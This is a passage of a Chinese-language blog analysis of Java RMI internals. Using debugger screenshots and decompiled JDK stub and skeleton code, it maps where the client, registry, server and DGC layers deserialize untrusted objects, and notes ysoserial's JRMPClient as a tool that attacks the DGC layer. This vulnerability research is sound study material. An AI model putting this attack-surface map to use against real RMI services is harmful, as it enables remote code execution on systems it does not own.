         var3.writeObject(var1);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException var18) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling arguments&quot;</span>, var18);<br>        &#125;<br><br>        <span class="hljs-comment">//发起远程调用，</span><br>        <span class="hljs-built_in">super</span>.ref.invoke(var2);<br><br>        Remote var23;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">///从输入流中读取远程 registry 返回的对象</span><br>            <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>            <span class="hljs-comment">//</span><br>            var23 = (Remote)var6.readObject();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException var15) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling return&quot;</span>, var15);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var16) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling return&quot;</span>, var16);<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-built_in">super</span>.ref.done(var2);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> var23;<br>    &#125; <span class="hljs-keyword">catch</span> (RuntimeException var19) &#123;<br>        <span class="hljs-keyword">throw</span> var19;<br>    &#125; <span class="hljs-keyword">catch</span> (RemoteException var20) &#123;<br>        <span class="hljs-keyword">throw</span> var20;<br>    &#125; <span class="hljs-keyword">catch</span> (NotBoundException var21) &#123;<br>        <span class="hljs-keyword">throw</span> var21;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception var22) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnexpectedException</span>(<span class="hljs-string">&quot;undeclared checked exception&quot;</span>, var22);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>跟进 <strong>invoke</strong></p><p><strong>super.ref.invoke(var2);</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100488.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100413.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100826.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100956.png"></p><p>StreamRemoteCall 类中的 executeCall 是真正处理网络请求的方法</p><p><strong>executeCall 中有一步通过反序列化处理异常，如果注册中心有恶意对象，客户端在此处反序列化时被攻击。</strong></p><p><strong>由于 executeCall 是客户端网络请求的必经之路，所以这个反序列化几乎不可避免</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100633.png"></p><p>这里的 lookup 方法的作用就是去注册中心查找远程对象</p><h3 id="3-4-客户端-请求服务端"><a href="#3-4-客户端-请求服务端" class="headerlink" title="3.4 客户端-请求服务端"></a>3.4 客户端-请求服务端</h3><p><strong>同样注意开启服务端</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100785.png"></p><p>来到了 invoke</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100700.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100902.png"></p><p>这里又跟到了 StreamRemoteCall ，这样的请求同样可以被攻击</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100629.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101578.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100270.png"></p><p>结束 <font style="color:#080808;background-color:#ffffff;">call.executeCall(); 后会出现另一个反序列化点</font></p><p>进入 <strong>unmarshalValue</strong> </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101064.png"></p><p><strong>unmarshalValue 函数的作用就是根据目标类型，选择正确的方式从输入流中读取数据</strong>。</p><ul><li>对基本类型，用专门的 <code>readxxx()</code> 方法读取，再返回</li><li>对对象类型，直接调用 <code>readObject()</code> 反序列化</li></ul><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250807873.png"></p><p>returnValue 返回了 “HELLO”</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101630.png"></p><h4 id="总结-客户端产生的反序列化漏洞点"><a href="#总结-客户端产生的反序列化漏洞点" class="headerlink" title="总结-客户端产生的反序列化漏洞点"></a>总结-客户端产生的反序列化漏洞点</h4><ol><li>StreamRemoteCall.executeCall</li></ol><p>StreamRemoteCall 类中的 executeCall 是真正处理网络请求的方法</p><p><strong>executeCall 中有一步通过反序列化处理异常，如果注册中心有恶意对象，客户端在此处反序列化时被攻击。</strong></p><p><strong>由于 executeCall 是客户端网络请求的必经之路，所以这个反序列化几乎不可避免</strong></p><hr><p>executeCall 处理的协议就是<strong>JRMP 协议</strong></p><ol start="2"><li>unmarshalValue</li></ol><p>unmarshalValue 函数向服务端请求获取返回值时，返回值是通过反序列化产生的。</p><h3 id="3-5-注册中心-客户端请求时"><a href="#3-5-注册中心-客户端请求时" class="headerlink" title="3.5 注册中心-客户端请求时"></a>3.5 注册中心-客户端请求时</h3><p>前面说过，服务端创建了 stub 并将信息封装到 target，随后的 NewThreadAction 创建了一个新的线程，等待客户端的响应</p><blockquote><p>这个线程开启之后等待客户端的连接</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101934.png"></p></blockquote><p>现在进入创建线程的流程：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101994.png"></p><p>进入 run() 后，只能调用 <font style="color:#080808;background-color:#ffffff;">executeAcceptLoop，executeAcceptLoop 又创建了一个新的线程</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101732.png"></p><p>run 调用了 run0</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101959.png"></p><p>run0 前面都是在解析一些协议，重点是 <strong>handleMessages</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101134.png"></p><p>其中的 默认情况是调用了 serviceCall</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102514.png"></p><p>serviceCall 会从表中获取 target</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102601.png"></p><p>此处断点调试：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102239.png"></p><p>可以看到断点处的 stub 就是服务端创建好的东西</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102908.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102432.png"></p><p>之后会调用 disp.dispatch，disp 是一个分发器，用于将远程请求分发到服务端执行</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102528.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102834.png"></p><p>这里 skel 不为空就会调用 oldDispatch</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102594.png"></p><p><font style="color:#080808;background-color:#ffffff;">skel.dispatch</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102245.png"></p><p>而 <font style="color:#080808;background-color:#ffffff;">skel.dispatch 是属于 RegistryImpl_Skel 类中的 dispatch</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102876.png"></p><p>接下来就到了重点：</p><p><strong>RegistryImpl_Skel.class</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dispatch</span><span class="hljs-params">(Remote var1, RemoteCall var2, <span class="hljs-type">int</span> var3, <span class="hljs-type">long</span> var4)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-keyword">if</span> (var4 != <span class="hljs-number">4905912898345647071L</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SkeletonMismatchException</span>(<span class="hljs-string">&quot;interface hash mismatch&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">RegistryImpl</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> (RegistryImpl)var1;<br>        <span class="hljs-keyword">switch</span> (var3) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>                String var100;<br>                Remote var103;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var105</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>                    var100 = (String)var105.readObject();<br>                    var103 = (Remote)var105.readObject();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var94) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var94);<br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var95) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var95);<br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                    var2.releaseInputStream();<br>                &#125;<br><br>                var6.bind(var100, var103);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var93) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var93);<br>                &#125;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                var2.releaseInputStream();<br>                String[] var99 = var6.list();<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var102</span> <span class="hljs-operator">=</span> var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    var102.writeObject(var99);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var92) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var92);<br>                &#125;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                String var98;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var104</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>                    <span class="hljs-comment">//此处为注册中心，直接调用了反序列化</span><br>                    var98 = (String)var104.readObject();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var89) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var89);<br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var90) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var90);<br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                    var2.releaseInputStream();<br>                &#125;<br><br>                <span class="hljs-type">Remote</span> <span class="hljs-variable">var101</span> <span class="hljs-operator">=</span> var6.lookup(var98);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var9</span> <span class="hljs-operator">=</span> var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    var9.writeObject(var101);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var88) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var88);<br>                &#125;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>                Remote var8;<br>                String var97;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var11</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>                    var97 = (String)var11.readObject();<br>                    var8 = (Remote)var11.readObject();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var85) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var85);<br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var86) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var86);<br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                    var2.releaseInputStream();<br>                &#125;<br><br>                var6.rebind(var97, var8);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var84) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var84);<br>                &#125;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>                String var7;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var10</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>                    var7 = (String)var10.readObject();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var81) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var81);<br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var82) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var82);<br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                    var2.releaseInputStream();<br>                &#125;<br><br>                var6.unbind(var7);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var80) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var80);<br>                &#125;<br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;invalid method number&quot;</span>);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="总结-注册中心产生的漏洞点"><a href="#总结-注册中心产生的漏洞点" class="headerlink" title="总结-注册中心产生的漏洞点"></a>总结-注册中心产生的漏洞点</h4><ol><li>客户端在请求时 （<code>IRemoteObj remoteObj = (IRemoteObj) registry.lookup(&quot;remoteObj&quot;);</code>），<code>lookup</code>的对象是序列化后传到注册中心的，而注册中心的 **RegistryImpl_Skel **中，大部分 case 的函数都有反序列化。如果是一个恶意序列化对象，在注册中心运行到 **RegistryImpl_Skel **时，会产生反序列化漏洞 <code>var98 = (String)var104.readObject();</code></li></ol><h3 id="3-6-服务端-客户端请求时"><a href="#3-6-服务端-客户端请求时" class="headerlink" title="3.6 服务端-客户端请求时"></a>3.6 服务端-客户端请求时</h3><p>过程和注册中心被客户端请求时一样，但要注意，调试的时候需要代理是动态代理，按 F9 让程序往下运行直到得到动态代理。</p><p>图中的 RegistryImpl_Stub   DGCImpl_Stub 都不是想要的</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250808002.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102343.png"></p><p>最终拿到的 $Proxy0 是我们需要的动态代理</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102929.png"></p><p>同样来到 disp.dispatch</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102257.png"></p><p>不一样的是在 <code>skel != null</code>判断时，此时的 skel 为空，不进入 oldDispatch</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102391.png"></p><p>继续走，获取远程方法 sayHello</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102266.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102994.png"></p><p>之后会进入 <font style="color:#080808;background-color:#ffffff;">unmarshalValue，在 客户端产生的反序列化漏洞点 中也有 unmarshalValue</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102963.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102427.png"></p><p>最终在 <code>result = method.invoke(obj, params);</code><font style="color:#080808;background-color:#ffffff;"> 这一步完成远程调用</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103076.png"></p><h3 id="3-7-DGC-客户端请求服务端"><a href="#3-7-DGC-客户端请求服务端" class="headerlink" title="3.7 DGC-客户端请求服务端"></a>3.7 DGC-客户端请求服务端</h3><blockquote><p><font style="color:rgb(51, 51, 51);">分布式垃圾回收，又称DGC，RMI使用DGC来做垃圾回收，因为跨虚拟机的情况下要做垃圾回收没办法使用原有的机制。我们使用的远程对象只有在客户端和服务端都不受引用时才会结束生命周期。</font></p><p><font style="color:rgb(51, 51, 51);">而既然RMI依赖于DGC做垃圾回收，那么在RMI服务中必然会有DGC层，在yso中攻击DGC层对应的是JRMPClient，在攻击RMI Registry小节中提到了skel和stub对应的Registry的服务端和客户端，同样的，DGC层中也会有skel和stub对应的代码，也就是DGCImpl_Skel和DGCImpl_Stub，我们可以直接从此处分析，避免冗长的debug。</font></p><p><font style="color:rgb(51, 51, 51);">而客户端一方在使用服务端的远程引用时需要调用dirty来注册，在用完时需要调用clean进行清除。</font></p></blockquote><p><strong><font style="color:#080808;background-color:#ffffff;">DGCImpl_Stub</font></strong></p><p><font style="color:rgb(80, 80, 92);">clean 就是”强”清除内存，dirty 就是”弱”清除内存</font></p><p><font style="color:rgb(80, 80, 92);">这里调用了 </font><code>readObject()</code><font style="color:rgb(80, 80, 92);"> 方法，存在反序列化的入口类。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">clean</span><span class="hljs-params">(ObjID[] var1, <span class="hljs-type">long</span> var2, VMID var4, <span class="hljs-type">boolean</span> var5)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">RemoteCall</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">super</span>.ref.newCall(<span class="hljs-built_in">this</span>, operations, <span class="hljs-number">0</span>, -<span class="hljs-number">669196253586618813L</span>);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var7</span> <span class="hljs-operator">=</span> var6.getOutputStream();<br>            var7.writeObject(var1);<br>            var7.writeLong(var2);<br>            var7.writeObject(var4);<br>            var7.writeBoolean(var5);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException var8) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling arguments&quot;</span>, var8);<br>        &#125;<br><br>        <span class="hljs-built_in">super</span>.ref.invoke(var6);<br>        <span class="hljs-built_in">super</span>.ref.done(var6);<br>    &#125; <span class="hljs-keyword">catch</span> (RuntimeException var9) &#123;<br>        <span class="hljs-keyword">throw</span> var9;<br>    &#125; <span class="hljs-keyword">catch</span> (RemoteException var10) &#123;<br>        <span class="hljs-keyword">throw</span> var10;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception var11) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnexpectedException</span>(<span class="hljs-string">&quot;undeclared checked exception&quot;</span>, var11);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> Lease <span class="hljs-title function_">dirty</span><span class="hljs-params">(ObjID[] var1, <span class="hljs-type">long</span> var2, Lease var4)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">RemoteCall</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">super</span>.ref.newCall(<span class="hljs-built_in">this</span>, operations, <span class="hljs-number">1</span>, -<span class="hljs-number">669196253586618813L</span>);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> var5.getOutputStream();<br>            var6.writeObject(var1);<br>            var6.writeLong(var2);<br>            var6.writeObject(var4);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException var20) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling arguments&quot;</span>, var20);<br>        &#125;<br><br>        <span class="hljs-built_in">super</span>.ref.invoke(var5);<br><br>        Lease var24;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var9</span> <span class="hljs-operator">=</span> var5.getInputStream();<br>            var24 = (Lease)var9.readObject();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException var17) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling return&quot;</span>, var17);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var18) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling return&quot;</span>, var18);<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-built_in">super</span>.ref.done(var5);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> var24;<br>    &#125; <span class="hljs-keyword">catch</span> (RuntimeException var21) &#123;<br>        <span class="hljs-keyword">throw</span> var21;<br>    &#125; <span class="hljs-keyword">catch</span> (RemoteException var22) &#123;<br>        <span class="hljs-keyword">throw</span> var22;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception var23) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnexpectedException</span>(<span class="hljs-string">&quot;undeclared checked exception&quot;</span>, var23);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong><font style="color:rgb(51, 51, 51);">DGCImpl_Skel</font></strong></p><p><font style="color:rgb(51, 51, 51);">也存在漏洞点</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span 